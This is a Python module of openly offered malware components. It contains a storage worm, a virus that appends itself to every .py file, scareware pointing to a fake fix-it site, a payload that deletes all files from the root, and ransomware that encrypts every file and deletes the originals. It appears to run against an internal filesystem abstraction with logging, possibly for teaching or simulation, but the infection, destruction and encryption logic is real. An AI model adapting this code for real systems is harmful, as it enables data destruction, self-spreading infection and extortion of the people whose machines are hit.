import os
from abc import ABC, abstractmethod

from . import _log as log
from ._encryption import AES, RSA
from ._system import Path, System


class Propagation(ABC):
    @abstractmethod
    def propagate(self, system: System) -> None:
        pass


class StorageWorm(Propagation):
    def propagate(self, system: System) -> None:
        code = system.own_path.read_bytes()
        for path in system.path("/").walk():
            if path.is_mount():
                copy_path = path / "worm.py"
                log.info("Propagating to: %s", copy_path)
                copy_path.write_bytes(code)


class PyVirus(Propagation):
    def propagate(self, system: System) -> None:
        code = system.own_path.read_bytes()
        for path in system.path("/").walk():
            if path.is_file() and path.name.endswith(".py"):
                previous_code = path.read_bytes()
                if b"class PyVirus(Propagation)" in previous_code:
                    log.info("Already infected: %s", path)
                else:
                    log.info("Infecting: %s", path)
                    path.write_bytes(previous_code + b"\n" + code)


class Payload(ABC):
    @abstractmethod
    def execute(self, system: System) -> None:
        pass


class Scareware(Payload):
    def execute(self, system: System) -> None:
        del system  # Unused
        message = (
            "\nWARNING: CRITICAL SYSTEM ERROR\n\n"
            "Your system has detected a severe malware infection.\n"
            "This could result in:\n"
            "- Loss of personal files\n"
            "- Identity theft\n"
            "- Unauthorized access to your bank accounts\n\n"
            "DO NOT TURN OFF YOUR COMPUTER\n\n"
            "To resolve this issue and restore system integrity, visit:\n"
            "www.fixmyerror24x7.example\n\n"
            "Failure to take action may result in permanent data loss and system damage."
        )
        log.info(message)


class DeleteFiles(Payload):
    def execute(self, system: System) -> None:
        for path in system.path("/").walk():
            if path != system.own_path:
                log.info("Removing: %s", path)
                path.remove()


class Ransomware(Payload):
    def execute(self, system: System) -> None:
        key_path = system.path("/key")

        if key_path.exists():
            log.info("System already infected")
            return

        key = self._generate_key(key_path)
        encryptor = AES(key)

        for path in system.path("/").walk():
            if path not in (system.own_path, key_path) and path.is_file():
                log.info("Encrypting: %s", path)
                data = path.read_bytes()
                enc_path = system.path(str(path) + ".encrypted")
                enc_path.write_bytes(encryptor.encrypt(data))
                path.remove()

    def _generate_key(self, path: Path) -> bytes:
        rsa = RSA()
        log.info("Attacker public key: %s", rsa.public_key)
        log.info("Attacker private key: %s", rsa.private_key)
        key = os.urandom(32)
        path.write_bytes(rsa.encrypt(key))
        return key


class Malware:
    def __init__(
        self,
        payload: Payload | None = None,
        propagation: Propagation | None = None,
    ) -> None:
        self._payload = payload
        self._propagation = propagation

    def execute(self) -> None:
        system = System()

        if self._payload:
            log.info("Begin payload phase...")
            self._payload.execute(system)
            log.info("Done")

        if self._propagation:
            log.info("Begin propagation phase...")
            self._propagation.propagate(system)
            log.info("Done")
